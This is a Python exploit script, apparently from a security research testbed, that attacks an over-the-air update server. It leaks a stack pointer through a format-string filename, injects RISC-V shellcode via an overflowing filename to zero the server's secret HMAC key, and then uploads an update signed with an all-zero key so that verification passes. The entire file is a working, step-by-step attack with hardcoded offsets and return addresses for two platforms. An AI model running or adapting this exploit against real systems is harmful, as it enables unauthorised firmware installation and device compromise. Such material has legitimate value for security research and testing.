#! /usr/bin/env python3
"""
Hacks Over-The-Air update server on Cyberphys P2

Use hello-world binary for testing (it simply prints 'Hello world')

TODO: make it a library so it can be called as needed (hack OTA, upload binary, etc.)
"""
import argparse
import hmac
import re
import requests
import os
import subprocess

ASCII_LOWERCASE_X = 0x78 # 'x' = 0x78 = 120

PAYLOAD_SIZE = 96 # bytes
POINTER_SIZE = 8  # bytes
KEY_SIZE = 8 # bytes

# Calculated offsets
BUFFER_POINTER_OFFSET = {}
BUFFER_POINTER_OFFSET['FreeBSD'] = 128
BUFFER_POINTER_OFFSET['Debian'] = BUFFER_POINTER_OFFSET['FreeBSD']
NEXT_FRAME_POINTER_OFFSET = {}
NEXT_FRAME_POINTER_OFFSET['FreeBSD'] = 304
NEXT_FRAME_POINTER_OFFSET['Debian'] = NEXT_FRAME_POINTER_OFFSET['FreeBSD']
THIS_FRAME_POINTER_OFFSET = {}
THIS_FRAME_POINTER_OFFSET['FreeBSD'] = 224
THIS_FRAME_POINTER_OFFSET['Debian'] = THIS_FRAME_POINTER_OFFSET['FreeBSD']

# From the ELF file
#         switch (cmd)
#         {
#         case OTA_FILENAME:
#             process_patch_filename(pch, (size_t)requestLength, tx_buf, HTTP_BUFFER_LENGTH);
#    11c58:	fe442703          	lw	a4,-28(s0)
#    11c5c:	40000693          	li	a3,1024
#    11c60:	000147b7          	lui	a5,0x14
#    11c64:	3a078613          	addi	a2,a5,928 # 143a0 <tx_buf>
#    11c68:	00070593          	mv	a1,a4
#    11c6c:	fd843503          	ld	a0,-40(s0)
#    11c70:	258000ef          	jal	ra,11ec8 <process_patch_filename>
#             break;
#    11c74:	0a40006f          	j	11d18 <http_parse_request+0x2cc>
#         case OTA_FILE:
#             // here, we have to pass the file descriptor along because the data may be large
#             process_patch_file(pch, bufferRemaining, fd, (size_t)requestLength, tx_buf, HTTP_BUFFER_LENGTH);

RETURN_ADDRESS = {}
RETURN_ADDRESS['FreeBSD'] = 0x11c74
RETURN_ADDRESS['Debian'] = 0x11da4
# Address of the ota_secret_key variable
# (gdb) p &ota_secret_key
# $1 = (char (*)[64]) 0x147a0 <ota_secret_key>
KEY_ADDRESS = {}
KEY_ADDRESS['FreeBSD'] = 0x147a0
KEY_ADDRESS['Debian'] = 0x165b0

# sensible defaults for filename and URL

DEFAULT_UPDATE_PATH = 'update.elf'
DEFAULT_URL = "http://172.16.3.2:5050"

parser = argparse.ArgumentParser(description='hack a server with an update file')
parser.add_argument('filename', default=DEFAULT_UPDATE_PATH, help="the file to send ot the server")
parser.add_argument('--url', help='server url', default=DEFAULT_URL)
parser.add_argument('--test', help='test mode (no exploit)', action='store_true')
parser.add_argument('--platform', help='platform to target', default='Debian', choices=['Debian', 'FreeBSD'])

args = parser.parse_args()
update_path = os.path.abspath(os.path.expanduser(args.filename))
url = args.url

if not os.path.isfile(update_path):
    print(">>> Specified file {} does not exist, exiting".format(update_path))
    exit(1)

# extract base filename from path, cross-platform style
update_filename = os.path.basename(update_path)
print(">>> Uploading {} to server as {}".format(update_path, update_filename))

update_file_bytes = {}
with open(update_path, "r+b") as f:
    # read data from the update file
    update_file_bytes = f.read()

# if URL ends in a trailing slash, get rid of the trailing slash
if url[-1] == '/':
    url = url[0:-1]
    
print(">>> Attempting to upload {} byte file {} to " \
      "server \n     at URL {}".format(len(update_file_bytes), update_filename, url))

# compute the HMAC for the file, with our "key" (64 zero bytes)
emptykey = bytes(KEY_SIZE)
digest = hmac.new(emptykey, msg=update_file_bytes, digestmod='sha256')

print(">>> Computed HMAC: {}".format(digest.hexdigest()))

resp = requests.get(url)
assert(resp.status_code == 200)
print(resp.content)

# Set the filename to something reasonable
print(">>> Setting filename to something reasonable.")
print(url+"/filename/{}".format(len(update_filename)))
resp = requests.patch(url+"/filename/{}".format(len(update_filename)), update_filename)
assert(resp.status_code == 200)
print(resp.content)

# Upload the file
print(">>> Attempting to upload file (pre-hack).")
print(url+"/file/{}".format(len(update_file_bytes)))
resp = requests.patch(url+"/file/{}".format(len(update_file_bytes)), update_file_bytes)
assert(resp.status_code == 200)
print(resp.content)
    
# Attempt verification
print(">>> Attempting to pass verification (pre-hack, should fail on server side).")
print(url+"/signature/{}".format(len(digest.digest())))
resp = requests.patch(url+"/signature/{}".format(len(digest.digest())), digest.digest())
assert(resp.status_code == 200)
print(str(resp.content))

if args.test:
    print(">>> Test mode. Exiting.")
    exit(0)

filename = '.elf%p%p%p%p%p'
print(">>> Sending evil filename to get leaked stack pointer.")
print(url+"/filename/{}".format(len(filename)))
resp = requests.patch(url+"/filename/{}".format(len(filename)), filename)
assert(resp.status_code == 200)
print(resp.content)

print("Parsing {}".format(resp.content))

idx = resp.content.find(ASCII_LOWERCASE_X,6) - 1
leaked_pointer = int(resp.content[idx:idx+12],16)
buffer_pointer = leaked_pointer + BUFFER_POINTER_OFFSET[args.platform]
next_frame_pointer = leaked_pointer + NEXT_FRAME_POINTER_OFFSET[args.platform]
this_frame_pointer = leaked_pointer + THIS_FRAME_POINTER_OFFSET[args.platform]

print(">>> Leaked stack pointer: " + hex(leaked_pointer))
print(">>> Calculated buffer_pointer: " + hex(buffer_pointer))
print(">>> Calculated next_frame_pointer: " + hex(next_frame_pointer))
print(">>> Calculated this_frame_pointer: " + hex(this_frame_pointer))

# Now we have the next frame pointer, and buffer pointer, and we have to append
# those at the end of the binary file

# Malicious payload
# Set the secret key to zero
# t3 - stores KEY_ADDRESS
# t4 - stores idx value
# t5 - secret key length
# t6 - buffer address (beginning of "program")
payload = [
        "li t3, {}\n".format(hex(KEY_ADDRESS[args.platform])), # load key address
        "li t4, 0\n", # load index and zero it out
        "li t5, 64\n", # secret key length
        "li t6, {}\n".format(hex(buffer_pointer)), # load key address
        "1:\n",
        "    beq t4, t5, 2f\n",
        "    sb zero, 0(t3)\n",
        "    addi t3, t3, 1\n",
        "    addi t4, t4, 1\n",
        "    j 1b\n",
        "2:\n",
        "    li ra, {}\n".format(hex(RETURN_ADDRESS[args.platform])), # set the proper return address
        "    ret\n",
        ]

# Writing to file
print(">>> Generating malicious payload source file.")
with open("payload.asm", "w") as f: 
    # Writing data to a file 
    f.writelines(payload)

# Compile
print(">>> Building malicious payload.")
cmd = "riscv64-unknown-elf-as -march=rv64ima payload.asm -o payload.elf"
subprocess.call(cmd,shell=True)
cmd = "riscv64-unknown-elf-objcopy -O binary --only-section=.text payload.elf payload.bin"
subprocess.call(cmd,shell=True)

# Bytes representing the next frame pointer $fp and the buffer pointer
# Total 16 bytes
# For example:
# 0xfffff630	0x0000003f	0x00011768	0x00000000
fp_bytes = next_frame_pointer.to_bytes(POINTER_SIZE, byteorder='little')
ra_bytes = buffer_pointer.to_bytes(POINTER_SIZE, byteorder='little')

# read data from temporary payload file
with open("payload.bin", "r+b") as f: 
    payload_bytes = f.read()
    # make the payload a total of PAYLOAD_SIZE bytes while appending fp/ra_bytes
    payload_bytes = payload_bytes + \
                    bytes(PAYLOAD_SIZE - len(payload_bytes) - 
                          len(fp_bytes) - len(ra_bytes)) + \
                    fp_bytes + ra_bytes
    
# rewrite the file, so we know what we actually sent
with open("payload.bin", "w+b") as f: 
    f.write(payload_bytes)

# Upload the payload as "filename"
print(f">>> Deploying malicious payload to server via another evil filename. Payload is {len(payload_bytes)} bytes long.")
print(url+"/filename/{}".format(len(payload_bytes)))
resp = requests.patch(url+"/filename/{}".format(len(payload_bytes)), payload_bytes)
assert(resp.status_code == 200)
print(resp.content)

# Set the filename to something reasonable
print(">>> Setting the filename back to something reasonable.")
print(url+"/filename/{}".format(len(update_filename)))
resp = requests.patch(url+"/filename/{}".format(len(update_filename)), update_filename)
assert(resp.status_code == 200)
print(resp.content)

# Upload the file
print(">>> Attempting to upload file.")
print(url+"/file/{}".format(len(update_file_bytes)))
resp = requests.patch(url+"/file/{}".format(len(update_file_bytes)), update_file_bytes)
assert(resp.status_code == 200)
print(resp.content)
    
# Attempt verification
print(">>> Attempting to pass verification (should pass on server side).")
print(url+"/signature/{}".format(len(digest.digest())))
resp = requests.patch(url+"/signature/{}".format(len(digest.digest())), digest.digest())
assert(resp.status_code == 200)
print(resp.content)

# Check if it succeeded
if "Verification OK" in str(resp.content):
    print("Hack Successful!")
    exit(0)
else:
    print("Hack Failed!")
    exit(1)
